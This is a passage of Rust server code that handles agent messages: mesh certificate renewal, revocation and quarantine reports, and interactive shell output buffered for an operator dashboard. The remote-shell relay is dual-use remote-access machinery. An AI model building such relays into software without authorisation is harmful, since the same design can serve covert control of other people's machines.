                                e.mesh_certificate.as_ref().map(|c| c.public_key),
                            )
                        })
                        .unwrap_or_default();

                    let public_key = heartbeat_pk
                        .filter(|pk| *pk != [0u8; 32])
                        .or_else(|| cert_pk.filter(|pk| *pk != [0u8; 32]));

                    let Some(public_key) = public_key else {
                        tracing::warn!(
                            connection_id = %conn_id,
                            agent_id = %agent_id,
                            "mesh certificate renewal skipped: no valid non-zero mesh public key"
                        );
                        continue;
                    };

                    match crate::api::load_signing_key(&state) {
                        Ok(signing_key) => {
                            let cert = crate::api::sign_mesh_certificate(
                                &signing_key,
                                &agent_id,
                                &public_key,
                                compartment.as_deref(),
                            );
                            tracing::info!(
                                connection_id = %conn_id,
                                agent_id = %agent_id,
                                "renewed mesh certificate"
                            );
                            if let Some(mut entry) = state.registry.get_mut(&conn_id) {
                                entry.mesh_certificate = Some(cert.clone());
                            }
                            if tx
                                .send(Message::MeshCertificateIssuance { certificate: cert })
                                .await
                                .is_err()
                            {
                                tracing::warn!(
                                    connection_id = %conn_id,
                                    "failed to send renewed mesh certificate"
                                );
                            }
                        }
                        Err(e) => {
                            tracing::warn!(
                                connection_id = %conn_id,
                                "failed to load signing key for cert renewal: {:?}",
                                e
                            );
                        }
                    }
                }
            }
            Message::MeshCertificateRevocation {
                revoked_agent_id_hash,
            } => {
                // An agent reports a certificate revocation from the mesh.
                tracing::warn!(
                    connection_id = %conn_id,
                    "mesh certificate revocation reported: agent_hash={:?}",
                    revoked_agent_id_hash
                );
                state.revoked_certificates.insert(revoked_agent_id_hash);
            }
            Message::MeshQuarantineReport {
                quarantined_agent_id_hash,
                reason,
                evidence_hash,
            } => {
                // An agent reports a quarantine event in the mesh.
                tracing::warn!(
                    connection_id = %conn_id,
                    "mesh quarantine report: agent_hash={:?} reason={} evidence={:?}",
                    quarantined_agent_id_hash, reason, evidence_hash
                );
                // Store in audit log for operator awareness.
                let reporting_agent = state
                    .registry
                    .get(&conn_id)
                    .map(|e| e.agent_id.clone())
                    .unwrap_or_else(|| conn_id.clone());
                state.audit.record(common::AuditEvent {
                    timestamp: now_secs(),
                    agent_id: reporting_agent,
                    user: "mesh".to_string(),
                    action: format!(
                        "MeshQuarantineReport(agent_hash={:?}, reason={})",
                        quarantined_agent_id_hash, reason
                    ),
                    outcome: common::Outcome::Success,
                    details: format!("evidence_hash={:?}", evidence_hash),
                    tampered: false,
                });
            }
            Message::ShellOutput {
                session_id,
                data,
                stream,
            } => {
                // ── Interactive shell output stream ────────────────────
                // Asynchronous output from a persistent shell process.
                // Buffer output for operator polling via the REST API.
                let stream_name = match stream {
                    common::ShellStream::Stdout => "stdout",
                    common::ShellStream::Stderr => "stderr",
                };
                tracing::info!(
                    connection_id = %conn_id,
                    session_id,
                    stream = stream_name,
                    data_len = data.len(),
                    "shell output: {}",
                    data.chars().take(200).collect::<String>()
                );
                let reporting_agent = state
                    .registry
                    .get(&conn_id)
                    .map(|e| e.agent_id.clone())
                    .unwrap_or_else(|| conn_id.clone());
                // Push to the shell output buffer so the operator dashboard
                // can retrieve it via GET /api/agents/:id/shell/:sid/output.
                let buffer_key = (reporting_agent.clone(), session_id);
                let entry = state
                    .shell_output_buffers
                    .entry(buffer_key)
                    .or_insert_with(|| {
                        std::sync::Mutex::new(std::collections::VecDeque::with_capacity(256))
                    });
                if let Ok(mut q) = entry.lock() {
                    q.push_back(data.clone());
                    // Cap at 2000 chunks to avoid unbounded memory growth.
                    while q.len() > 2000 {
                        q.pop_front();
                    }
                }
                state.audit.record(common::AuditEvent {
                    timestamp: now_secs(),
                    agent_id: reporting_agent,
                    user: "shell".to_string(),
                    action: format!("ShellOutput(session={session_id}, stream={stream_name})"),
                    outcome: common::Outcome::Success,
                    details: format!("{} bytes", data.len()),
                    tampered: false,
                });
            }
            other => {
                tracing::debug!("ignoring agent->server message: {:?}", other);
            }
        }
    }

    drop(tx);
    let _ = writer.await;
    if registered {
        // Release the morph seed back to the available pool.
        let removed_entry = if let Some(entry) = state.registry.remove(&conn_id) {
            let agent_id = entry.1.agent_id.clone();
            state.release_seed(entry.1.morph_seed);
            Some(agent_id)
        } else {
            // conn_id was already removed by the `if let` branch above.
            // The key is no longer present — this else branch only runs when
            // the first remove() call above returned None.
            None
        };
        // Clean up the topology map for this agent.
        if let Some(agent_id) = removed_entry {
            state.remove_from_topology(&agent_id).await;
        }
        tracing::debug!(connection_id = %conn_id, "agent entry removed from registry");
    }
    Ok(())
}
